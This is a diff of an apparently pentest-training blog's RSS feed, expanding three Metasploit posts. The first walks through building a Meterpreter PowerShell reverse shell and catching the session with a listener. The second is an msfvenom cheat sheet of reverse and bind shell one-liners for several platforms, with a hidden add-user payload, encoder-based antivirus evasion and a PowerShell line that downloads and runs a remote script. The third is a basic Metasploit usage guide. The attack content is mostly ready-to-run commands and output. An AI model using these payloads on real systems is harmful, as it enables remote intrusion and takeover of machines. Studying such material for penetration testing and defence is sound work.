@@ -1,21 +1,64 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>metasploit on Classroom</title>
-    <link>https://classroom.anir0y.in/tags/metasploit/</link>
-    <description>Recent content in metasploit on Classroom</description>
+    <title>Metasploit on Classroom</title>
+    <link>http://localhost:1313/tags/metasploit/</link>
+    <description>Recent content in Metasploit on Classroom</description>
     <generator>Anir0ry : Blog v1.0</generator>
     <language>en</language>
     <copyright>YOU CAN REUSE MY CONTENT</copyright>
-    <lastBuildDate>Thu, 01 Apr 2021 16:14:32 +0530</lastBuildDate><atom:link href="https://classroom.anir0y.in/tags/metasploit/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 01 Apr 2021 16:14:32 +0530</lastBuildDate><atom:link href="http://localhost:1313/tags/metasploit/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Msfvenom Psh</title>
       <pubDate>Thu, 01 Apr 2021 16:14:32 +0530</pubDate>
       
       <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"></media:content>
-      <description>meterpreter reverse shell with powershell Create Shell root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=443 -f psh -o meterpreter-64.ps1 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder or badchars specified, outputting raw payload Payload size: 510 bytes Final size of psh file: 3255 bytes Saved as: meterpreter-64.ps1 Setup listener msfconsole -x &amp;#34;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.10.6; set lport 443; set ExitOnSession false; exploit -j&amp;#34; Interact .</description>
+      <description>&lt;h1 id=&#34;meterpreter-reverse-shell-with-powershell&#34;&gt;meterpreter reverse shell with powershell&lt;/h1&gt;
+&lt;h2 id=&#34;create-shell&#34;&gt;Create Shell&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;10.10.10.6 LPORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt; -f psh -o meterpreter-64.ps1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: x64 from the payload
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;No encoder or badchars specified, outputting raw payload
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Payload size: &lt;span style=&#34;color:#ae81ff&#34;&gt;510&lt;/span&gt; bytes
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Final size of psh file: &lt;span style=&#34;color:#ae81ff&#34;&gt;3255&lt;/span&gt; bytes
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Saved as: meterpreter-64.ps1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;setup-listener&#34;&gt;Setup listener&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfconsole -x &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.10.6; set lport 443; set ExitOnSession false; exploit -j&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;interact&#34;&gt;Interact&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;...[snip]
+payload =&amp;gt; windows/x64/meterpreter/reverse_tcp
+lhost =&amp;gt; 10.10.10.6
+lport =&amp;gt; 443
+ExitOnSession =&amp;gt; false
+[*] Exploit running as background job 0.
+
+[*] Started reverse TCP handler on 10.10.10.6:443 
+msf exploit(multi/handler) &amp;gt; [*] Sending stage (206403 bytes) to 10.10.10.5
+[*] Meterpreter session 1 opened (10.10.10.6:443 -&amp;gt; 10.10.10.5:53418) 
+
+msf exploit(multi/handler) &amp;gt; sessions -l
+
+Active sessions
+===============
+
+Id Name Type Information Connection
+-- ---- ---- ----------- ----------
+1 meterpreter x64/windows [redacted]
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;if-windows-defender-is-enabled&#34;&gt;if Windows Defender is enabled&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\PENTEST&amp;gt; C:\PENTEST\meterpreter-&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;.ps1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;At C:\PENTEST\meterpreter-&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;.ps1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; char&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+ $VlSIhDyrsor = &lt;span style=&#34;color:#e6db74&#34;&gt;@&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;+ ~~~~~~~~~~~~~~~~~
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;This script contains malicious content and has been blocked by your antivirus software.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;+ CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;+ FullyQualifiedErrorId : ScriptContainedMaliciousContent
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;PS C:\PENTEST&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;summary&#34;&gt;Summary:&lt;/h2&gt;
+&lt;p&gt;The the generated ps1 can be saved to disk, and is not detected as a virus , and runs succesfull creating a shell, but it can’t run with defender enabled on  windows 10 box.&lt;/p&gt;</description>
       <enclosure url="https://classroom.anir0y.in"></enclosure>
-      <link>https://classroom.anir0y.in/post/msfvenom-psh/</link>
+      <link>http://localhost:1313/post/msfvenom-psh/</link>
     
     </item>
    
@@ -26,11 +69,130 @@
       <pubDate>Thu, 01 Apr 2021 16:11:01 +0530</pubDate>
       
       <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"></media:content>
-      <description>MSFVenom Cheatsheet Single Page Cheatsheet for common MSF Venom One Liners
-Available in PDF, DOCX and Markdown format! PDF and DOCX versions contain the payload size in bytes and a few more commands.
-MSFVenom Cheatsheet    MSFVenom Payload Generation One-Liner Description     msfvenom -l payloads List available payloads   msfvenom -p PAYLOAD &amp;ndash;list-options List payload options   msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP Payload Encoding   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf &amp;gt; shell.</description>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;msfvenom-cheatsheet&#34;&gt;MSFVenom Cheatsheet&lt;/h1&gt;
+&lt;p&gt;Single Page Cheatsheet for common MSF Venom One Liners&lt;br&gt;
+Available in PDF, DOCX and Markdown format!
+&lt;em&gt;PDF and DOCX versions contain the payload size in bytes and a few more commands.&lt;/em&gt;&lt;/p&gt;
+&lt;h1 id=&#34;msfvenom-cheatsheet-1&#34;&gt;MSFVenom Cheatsheet&lt;/h1&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;MSFVenom Payload Generation One-Liner&lt;/th&gt;
+          &lt;th&gt;Description&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -l   payloads&lt;/td&gt;
+          &lt;td&gt;List available payloads&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p PAYLOAD &amp;ndash;list-options&lt;/td&gt;
+          &lt;td&gt;List payload options&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT   LHOST=IP&lt;/td&gt;
+          &lt;td&gt;Payload Encoding&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf  &amp;gt;  shell.elf&lt;/td&gt;
+          &lt;td&gt;Linux Meterpreter  reverse shell x86 multi stage&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf  &amp;gt;  shell.elf&lt;/td&gt;
+          &lt;td&gt;Linux Meterpreter  bind shell x86 multi stage&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p linux/x64/shell_bind_tcp   RHOST=IP LPORT=PORT -f elf &amp;gt; shell.elf&lt;/td&gt;
+          &lt;td&gt;Linux bind shell x64 single stage&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p linux/x64/shell_reverse_tcp   RHOST=IP LPORT=PORT -f elf &amp;gt; shell.elf&lt;/td&gt;
+          &lt;td&gt;Linux reverse shell x64 single stage&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe &amp;gt;   shell.exe&lt;/td&gt;
+          &lt;td&gt;Windows Meterpreter reverse shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent=&amp;ldquo;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&amp;rdquo; -f exe &amp;gt; shell.exe&lt;/td&gt;
+          &lt;td&gt;Windows Meterpreter http reverse shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe &amp;gt;   shell.exe&lt;/td&gt;
+          &lt;td&gt;Windows Meterpreter bind shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe &amp;gt;   shell.exe&lt;/td&gt;
+          &lt;td&gt;Windows CMD Multi Stage&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT   -f exe &amp;gt;  shell.exe&lt;/td&gt;
+          &lt;td&gt;Windows CMD Single Stage&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   windows/adduser USER=hacker PASS=password -f exe &amp;gt; useradd.exe&lt;/td&gt;
+          &lt;td&gt;Windows add user&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho &amp;gt;   shell.macho&lt;/td&gt;
+          &lt;td&gt;Mac Reverse Shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho  &amp;gt;  shell.macho&lt;/td&gt;
+          &lt;td&gt;Mac Bind shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw &amp;gt;   shell.py&lt;/td&gt;
+          &lt;td&gt;Python Shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw &amp;gt;   shell.sh&lt;/td&gt;
+          &lt;td&gt;BASH Shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw &amp;gt;   shell.pl&lt;/td&gt;
+          &lt;td&gt;PERL Shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp &amp;gt;   shell.asp&lt;/td&gt;
+          &lt;td&gt;ASP Meterpreter shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw  &amp;gt;  shell.jsp&lt;/td&gt;
+          &lt;td&gt;JSP Shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war &amp;gt;   shell.war&lt;/td&gt;
+          &lt;td&gt;WAR Shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw  &amp;gt;  shell.php   cat shell.php&lt;/td&gt;
+          &lt;td&gt;pbcopy &amp;amp;&amp;amp; echo &amp;lsquo;?php &#39;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   php/reverse_php LHOST=IP LPORT=PORT -f raw  &amp;gt;  phpreverseshell.php&lt;/td&gt;
+          &lt;td&gt;Php Reverse Shell&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -a x86   &amp;ndash;platform Windows -p windows/exec CMD=&amp;ldquo;powershell \&amp;ldquo;IEX(New-Object   Net.webClient).downloadString(&amp;lsquo;http://IP/nishang.ps1&amp;rsquo;)&amp;quot;&amp;rdquo;   -f python&lt;/td&gt;
+          &lt;td&gt;Windows Exec Nishang Powershell in   python&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b &amp;ldquo;\x04\xA0&amp;rdquo;&lt;/td&gt;
+          &lt;td&gt;Bad characters shikata_ga_nai&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b &amp;ldquo;\x04\xA0&amp;rdquo;&lt;/td&gt;
+          &lt;td&gt;Bad characters fnstenv_mov&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;multihandler-listener&#34;&gt;Multihandler Listener&lt;/h1&gt;
+&lt;p&gt;To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,&lt;/p&gt;</description>
       <enclosure url="https://classroom.anir0y.in"></enclosure>
-      <link>https://classroom.anir0y.in/post/msfvenom-cheatsheet/</link>
+      <link>http://localhost:1313/post/msfvenom-cheatsheet/</link>
     
     </item>
    
@@ -41,11 +203,43 @@ MSFVenom Cheatsheet    MSFVenom Payload Generation One-Liner Description     msf
       <pubDate>Sun, 21 Feb 2021 21:23:22 +0530</pubDate>
       
       <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"></media:content>
-      <description>Metasploit Cheat Sheet The Metasploit Project is a computer security project that provides information on vulnerabilities, helping in the development of penetration tests and IDS signatures.
-Metasploit is a popular tool used by pentest experts. I have prepared a document for you to learn.
-Metasploit : Search for module: msf &amp;gt; search [regex]Specify and exploit to use: msf &amp;gt; use exploit/[ExploitPath]Specify a Payload to use: msf &amp;gt; set PAYLOAD [PayloadPath]Show options for the current modules: msf &amp;gt; show optionsSet options: msf &amp;gt; set [Option] [Value]Start exploit: msf &amp;gt; exploit Useful Auxiliary Modules Port Scanner: msf &amp;gt; use auxiliary/scanner/portscan/tcpmsf &amp;gt; set RHOSTS 10.</description>
+      <description>&lt;h4 id=&#34;metasploit-cheat-sheet&#34;&gt;Metasploit Cheat Sheet&lt;/h4&gt;
+&lt;p&gt;The Metasploit Project is a computer security project that provides information on vulnerabilities, helping in the development of penetration tests and IDS signatures.&lt;/p&gt;
+&lt;p&gt;Metasploit is a popular tool used by pentest experts. I have prepared a document for you to learn.&lt;/p&gt;
+&lt;h4 id=&#34;metasploit-&#34;&gt;Metasploit :&lt;/h4&gt;
+&lt;h6 id=&#34;search-for-module&#34;&gt;Search for module:&lt;/h6&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; search [regex]
+&lt;/code&gt;&lt;/pre&gt;&lt;h6 id=&#34;specify-and-exploit-to-use&#34;&gt;Specify and exploit to use:&lt;/h6&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use exploit/[ExploitPath]
+&lt;/code&gt;&lt;/pre&gt;&lt;h6 id=&#34;specify-a-payload-to-use&#34;&gt;Specify a Payload to use:&lt;/h6&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; set PAYLOAD [PayloadPath]
+&lt;/code&gt;&lt;/pre&gt;&lt;h6 id=&#34;show-options-for-the-current-modules&#34;&gt;Show options for the current modules:&lt;/h6&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; show options
+&lt;/code&gt;&lt;/pre&gt;&lt;h6 id=&#34;set-options&#34;&gt;Set options:&lt;/h6&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; set [Option] [Value]
+&lt;/code&gt;&lt;/pre&gt;&lt;h6 id=&#34;start-exploit&#34;&gt;Start exploit:&lt;/h6&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; exploit 
+&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;useful-auxiliary-modules&#34;&gt;Useful Auxiliary Modules&lt;/h5&gt;
+&lt;h6 id=&#34;port-scanner&#34;&gt;Port Scanner:&lt;/h6&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/portscan/tcp
+msf &amp;gt; set RHOSTS 10.10.10.0/24
+msf &amp;gt; run
+&lt;/code&gt;&lt;/pre&gt;&lt;h6 id=&#34;dns-enumeration&#34;&gt;DNS Enumeration:&lt;/h6&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/gather/dns_enum
+msf &amp;gt; set DOMAIN target.tgt
+msf &amp;gt; run
+&lt;/code&gt;&lt;/pre&gt;&lt;h6 id=&#34;ftp-server&#34;&gt;FTP Server:&lt;/h6&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/server/ftp
+msf &amp;gt; set FTPROOT /tmp/ftproot
+msf &amp;gt; run
+&lt;/code&gt;&lt;/pre&gt;&lt;h6 id=&#34;proxy-server&#34;&gt;Proxy Server:&lt;/h6&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/server/socks4
+msf &amp;gt; run 
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;msfvenom-&#34;&gt;msfvenom :&lt;/h4&gt;
+&lt;p&gt;The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode
+them. This tool replaces the former msfpayload and msfencode tools. Run with ‘&amp;rsquo;-l payloads’ to get a list of payloads.&lt;/p&gt;</description>
       <enclosure url="https://classroom.anir0y.in"></enclosure>
-      <link>https://classroom.anir0y.in/post/metasploit-cheat-sheet/</link>
+      <link>http://localhost:1313/post/metasploit-cheat-sheet/</link>
     
     </item>
    
